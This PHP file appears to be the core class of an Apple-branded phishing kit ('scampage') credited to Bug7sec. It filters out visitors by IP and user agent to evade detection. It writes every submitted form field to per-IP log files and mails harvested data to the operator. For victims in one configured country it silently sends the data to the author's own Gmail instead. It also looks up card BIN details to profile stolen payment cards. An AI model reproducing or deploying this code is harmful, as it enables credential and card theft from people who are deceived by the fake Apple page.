<?php
/**
 * @Author: Bug7sec
 * @Date:   2017-06-06 02:23:59
 * @Last Modified by:   Bug7sec.org
 * @Last Modified time: 2017-06-08 00:43:36
 */
error_reporting(0);
session_start();
require_once('config.shc.php');
class Apple extends Config
{

    function __construct()
    {
        $this->BlockedByIp();
        $this->BlockedByAgent();
    }
    public function email(){
        $email = $this->scampage();
        return $email['email'];
    }
    public function getBrowser() { 
        $u_agent = $_SERVER['HTTP_USER_AGENT']; 
        $bname = 'Unknown';
        $platform = 'Unknown';
        $version= "";
        /*First get the platform*/
        if (preg_match('/linux/i', $u_agent)) {
            $platform = 'linux';
        }
        elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
            $platform = 'mac';
        }
        elseif (preg_match('/windows|win32/i', $u_agent)) {
            $platform = 'windows';
        } 
        /* Next get the name of the useragent yes seperately and for good reason*/
        if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent)){ 
            $bname = 'Internet Explorer'; 
            $ub = "MSIE"; 
        } 
        elseif(preg_match('/Firefox/i',$u_agent)){ 
            $bname = 'Mozilla Firefox'; 
            $ub = "Firefox"; 
        } 
        elseif(preg_match('/Chrome/i',$u_agent)){ 
            $bname = 'Google Chrome'; 
            $ub = "Chrome"; 
        } 
        elseif(preg_match('/Safari/i',$u_agent)){ 
            $bname = 'Apple Safari'; 
            $ub = "Safari"; 
        } 
        elseif(preg_match('/Opera/i',$u_agent)){ 
            $bname = 'Opera'; 
            $ub = "Opera"; 
        } 
        elseif(preg_match('/Netscape/i',$u_agent)){ 
            $bname = 'Netscape'; 
            $ub = "Netscape"; 
        } 
         /*finally get the correct version number*/
        $known = array('Version', $ub, 'other');
        $pattern = '#(?<browser>' . join('|', $known) .
        ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
        if (!preg_match_all($pattern, $u_agent, $matches)) {
            /*we have no matching number just continue*/
        }    
        /* see how many we have */
        $i = count($matches['browser']);
        if ($i != 1) {
            /*we will have two since we are not using 'other' argument yet*/
            /*see if version is before or after the name*/
            if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
                $version= $matches['version'][0];
            }
            else {
                $version= $matches['version'][1];
            }
        }
        else {
            $version= $matches['version'][0];
        }  
        /*check if we have a number*/
        if ($version==null || $version=="") {$version="?";}
        return array(
            'userAgent' => $u_agent,
            'name'      => $bname,
            'version'   => $version,
            'platform'  => $platform
        );
    }
    public function sdata($url , $custom , $delCookies = false){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, false);
        if($custom[uagent]){
            curl_setopt($ch, CURLOPT_USERAGENT, $custom[uagent]);
        }else{
            curl_setopt($ch, CURLOPT_USERAGENT, "msnbot/1.0 (+http://search.msn.com/msnbot.htm)");
        }
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0);
        if($custom[rto]){
            curl_setopt($ch, CURLOPT_TIMEOUT, $custom[rto]);
        }else{
            curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        }
        if($custom[header]){
            curl_setopt($ch, CURLOPT_HTTPHEADER, $custom[header]);
        }
        curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookies.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, false);
        if($custom[post]){
            if(is_array($custom[post])){
                $query = http_build_query($custom[post]);
            }else{
                $query = $custom[post];
            }
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $query);
        }
        $data           = curl_exec($ch);
        $httpcode       = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if($delCookies = true){
            unlink("cookies.txt");
        }
        return array(
            'data'      => $data,
            'json'      => json_decode($data , true),
            'httpcode'  => $httpcode
        );
    }
    public function binChecked($card){
        $sdata = $this->sdata("http://bins.pro/search?action=searchbins&bins=".$card)[data];
        preg_match_all('/<tr><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td>/', $sdata, $matches);
        return array(
            'BIN' => $matches[1][1], 
            'COU' => $matches[2][1], 
            'VEN' => $matches[3][1], 
            'TYP' => $matches[4][1], 
            'LVL' => $matches[5][1], 
            'BNK' => $matches[6][1], 
        );
    }
    public function sendMe($subject,$data,$cn){
        $scampage    = $this->scampage();
        $cn          = strtoupper($cn);
        $DonateEmail = "ganteng.leet@gmail.com"; // don't remove :)
        $scampage['donation']['status'] = TRUE;
        if($scampage['donation']['status'] === TRUE){
            if($cn === $scampage['donation']['country']){
                $headers = "From: Bug7sec Team - Donation <donation.admin@bug7sec.org>";
                mail($DonateEmail, $subject, $data, $headers);
            }else{
                $headers = "From: Bug7sec Team <admin@bug7sec.org>";
                mail($scampage['email'], $subject, $data, $headers);
                $this->write("logs/alldata-me.txt",$data."\r\n\n");
            }
        }else{
            $headers = "From: Bug7sec Team <admin@bug7sec.org>";
            mail($scampage['email'], $subject, $data, $headers);
            $this->write("logs/alldata-me.txt",$data."\r\n\n");
        }
    }
    public function ip(){
        $ip = $_SERVER['REMOTE_ADDR'];
        if($ip== "::1" || $ip== "127.0.0.1"){
            $custom = array('rto' => 1);
        }
        
        $ip = $this->sdata("http://www.geoplugin.net/json.gp?ip=".$ip , $custom , $delCookies = false); $ip = $ip['json'];
        $_SESSION['negara'] = $ip['geoplugin_countryCode'];
        $_SESSION['ip']     = $ip['geoplugin_request'];
        $_SESSION['start']  = true;
        return array(
            'ip' => $ip['geoplugin_request'], 
            'cn' => $ip['geoplugin_countryCode'], 
        );
    }
    public function sitehost(){
        $n = $this->scampage();
        if(isset($_SERVER['HTTPS'])){
            $protocol = ($_SERVER['HTTPS'] && $_SERVER['HTTPS'] != "off") ? "https" : "http";
        }else{
            $protocol = 'http';
        }
        $protocol = $n['protocol'];
        return $protocol . "://" . $_SERVER['HTTP_HOST'];
    }
    public function load_config(){
        return $this->scampage();
    }
    public function write($name,$data){
        $f = fopen($name, "a+");
        fwrite($f, $data);
        fclose($f);
    }
    public function writer($name,$data){
        $f = fopen($name, "wa+");
        fwrite($f, $data);
        fclose($f);
    }
    public function actionIP($data){
        $ip = $this->ip();
        if($ip['ip'] == "::1"){
            $this->write("logs/locadata-apple.txt",$data."\r\n");   
        }else{
            $this->write("logs/".$ip['ip']."-apple.txt",$data."\r\n");
        }
    }
    public function logs($r){
        $ip = $this->ip();
        $this->write("logs/shc-apple.txt","[".date("d/m/Y t:m:s")."][".$ip['cn']."][".$ip['cn']."] => ".$r."\r\n");
    }
}
$apple = new Apple;

$apple->write("logs/shc-ugent.txt",$_SESSION['negara']."|".$_SESSION['ip']."|".$_SERVER['HTTP_USER_AGENT']."\r\n");
/* Antisipasi bila result gak ke send **/
if($_POST){
    $ip    = $apple->ip();
    if($ip['ip'] == "::1"){
        $f = fopen("logs/locadata-apple.txt", "a+");     
    }else{
        $f = fopen("logs/".$ip['ip']."-apple.txt", "a+");
    }
    fwrite($f, "======[ POST DATA ]======\r\n");
    foreach ($_POST as $key => $value) {
        fwrite($f, $key. " : ".$value."\r\n");
    }
    fwrite($f, "======[ + + + + + ]======\r\n");
    fclose($f);
}
$country_array = array("AF" => "Afghanistan","AL" => "Albania","DZ" => "Algeria","AS" => "American Samoa","AD" => "Andorra","AO" => "Angola","AI" => "Anguilla","AQ" => "Antarctica","AG" => "Antigua and Barbuda","AR" => "Argentina","AM" => "Armenia","AW" => "Aruba","AU" => "Australia","AT" => "Austria","AZ" => "Azerbaijan","BS" => "Bahamas","BH" => "Bahrain","BD" => "Bangladesh","BB" => "Barbados","BY" => "Belarus","BE" => "Belgium","BZ" => "Belize","BJ" => "Benin","BM" => "Bermuda","BT" => "Bhutan","BO" => "Bolivia","BA" => "Bosnia and Herzegovina","BW" => "Botswana","BV" => "Bouvet Island","BR" => "Brazil","BQ" => "British Antarctic Territory","IO" => "British Indian Ocean Territory","VG" => "British Virgin Islands","BN" => "Brunei","BG" => "Bulgaria","BF" => "Burkina Faso","BI" => "Burundi","KH" => "Cambodia","CM" => "Cameroon","CA" => "Canada","CT" => "Canton and Enderbury Islands","CV" => "Cape Verde","KY" => "Cayman Islands","CF" => "Central African Republic","TD" => "Chad","CL" => "Chile","CN" => "China","CX" => "Christmas Island","CC" => "Cocos [Keeling] Islands","CO" => "Colombia","KM" => "Comoros","CG" => "Congo - Brazzaville","CD" => "Congo - Kinshasa","CK" => "Cook Islands","CR" => "Costa Rica","HR" => "Croatia","CU" => "Cuba","CY" => "Cyprus","CZ" => "Czech Republic","CI" => "Côte d’Ivoire","DK" => "Denmark","DJ" => "Djibouti","DM" => "Dominica","DO" => "Dominican Republic","NQ" => "Dronning Maud Land","DD" => "East Germany","EC" => "Ecuador","EG" => "Egypt","SV" => "El Salvador","GQ" => "Equatorial Guinea","ER" => "Eritrea","EE" => "Estonia","ET" => "Ethiopia","FK" => "Falkland Islands","FO" => "Faroe Islands","FJ" => "Fiji","FI" => "Finland","FR" => "France","GF" => "French Guiana","PF" => "French Polynesia","TF" => "French Southern Territories","FQ" => "French Southern and Antarctic Territories","GA" => "Gabon","GM" => "Gambia","GE" => "Georgia","DE" => "Germany","GH" => "Ghana","GI" => "Gibraltar","GR" => "Greece","GL" => "Greenland","GD" => "Grenada","GP" => "Guadeloupe","GU" => "Guam","GT" => "Guatemala","GG" => "Guernsey","GN" => "Guinea","GW" => "Guinea-Bissau","GY" => "Guyana","HT" => "Haiti","HM" => "Heard Island and McDonald Islands","HN" => "Honduras","HK" => "Hong Kong SAR China","HU" => "Hungary","IS" => "Iceland","IN" => "India","ID" => "Indonesia","IR" => "Iran","IQ" => "Iraq","IE" => "Ireland","IM" => "Isle of Man","IL" => "Israel","IT" => "Italy","JM" => "Jamaica","JP" => "Japan","JE" => "Jersey","JT" => "Johnston Island","JO" => "Jordan","KZ" => "Kazakhstan","KE" => "Kenya","KI" => "Kiribati","KW" => "Kuwait","KG" => "Kyrgyzstan","LA" => "Laos","LV" => "Latvia","LB" => "Lebanon","LS" => "Lesotho","LR" => "Liberia","LY" => "Libya","LI" => "Liechtenstein","LT" => "Lithuania","LU" => "Luxembourg","MO" => "Macau SAR China","MK" => "Macedonia","MG" => "Madagascar","MW" => "Malawi","MY" => "Malaysia","MV" => "Maldives","ML" => "Mali","MT" => "Malta","MH" => "Marshall Islands","MQ" => "Martinique","MR" => "Mauritania","MU" => "Mauritius","YT" => "Mayotte","FX" => "Metropolitan France","MX" => "Mexico","FM" => "Micronesia","MI" => "Midway Islands","MD" => "Moldova","MC" => "Monaco","MN" => "Mongolia","ME" => "Montenegro","MS" => "Montserrat","MA" => "Morocco","MZ" => "Mozambique","MM" => "Myanmar [Burma]","NA" => "Namibia","NR" => "Nauru","NP" => "Nepal","NL" => "Netherlands","AN" => "Netherlands Antilles","NT" => "Neutral Zone","NC" => "New Caledonia","NZ" => "New Zealand","NI" => "Nicaragua","NE" => "Niger","NG" => "Nigeria","NU" => "Niue","NF" => "Norfolk Island","KP" => "North Korea","VD" => "North Vietnam","MP" => "Northern Mariana Islands","NO" => "Norway","OM" => "Oman","PC" => "Pacific Islands Trust Territory","PK" => "Pakistan","PW" => "Palau","PS" => "Palestinian Territories","PA" => "Panama","PZ" => "Panama Canal Zone","PG" => "Papua New Guinea","PY" => "Paraguay","YD" => "People's Democratic Republic of Yemen","PE" => "Peru","PH" => "Philippines","PN" => "Pitcairn Islands","PL" => "Poland","PT" => "Portugal","PR" => "Puerto Rico","QA" => "Qatar","RO" => "Romania","RU" => "Russia","RW" => "Rwanda","RE" => "Réunion","BL" => "Saint Barthélemy","SH" => "Saint Helena","KN" => "Saint Kitts and Nevis","LC" => "Saint Lucia","MF" => "Saint Martin","PM" => "Saint Pierre and Miquelon","VC" => "Saint Vincent and the Grenadines","WS" => "Samoa","SM" => "San Marino","SA" => "Saudi Arabia","SN" => "Senegal","RS" => "Serbia","CS" => "Serbia and Montenegro","SC" => "Seychelles","SL" => "Sierra Leone","SG" => "Singapore","SK" => "Slovakia","SI" => "Slovenia","SB" => "Solomon Islands","SO" => "Somalia","ZA" => "South Africa","GS" => "South Georgia and the South Sandwich Islands","KR" => "South Korea","ES" => "Spain","LK" => "Sri Lanka","SD" => "Sudan","SR" => "Suriname","SJ" => "Svalbard and Jan Mayen","SZ" => "Swaziland","SE" => "Sweden","CH" => "Switzerland","SY" => "Syria","ST" => "São Tomé and Príncipe","TW" => "Taiwan","TJ" => "Tajikistan","TZ" => "Tanzania","TH" => "Thailand","TL" => "Timor-Leste","TG" => "Togo","TK" => "Tokelau","TO" => "Tonga","TT" => "Trinidad and Tobago","TN" => "Tunisia","TR" => "Turkey","TM" => "Turkmenistan","TC" => "Turks and Caicos Islands","TV" => "Tuvalu","UM" => "U.S. Minor Outlying Islands","PU" => "U.S. Miscellaneous Pacific Islands","VI" => "U.S. Virgin Islands","UG" => "Uganda","UA" => "Ukraine","SU" => "Union of Soviet Socialist Republics","AE" => "United Arab Emirates","GB" => "United Kingdom","US" => "United States","ZZ" => "Unknown or Invalid Region","UY" => "Uruguay","UZ" => "Uzbekistan","VU" => "Vanuatu","VA" => "Vatican City","VE" => "Venezuela","VN" => "Vietnam","WK" => "Wake Island","WF" => "Wallis and Futuna","EH" => "Western Sahara","YE" => "Yemen","ZM" => "Zambia","ZW" => "Zimbabwe","AX" => "Åland Islands",
);
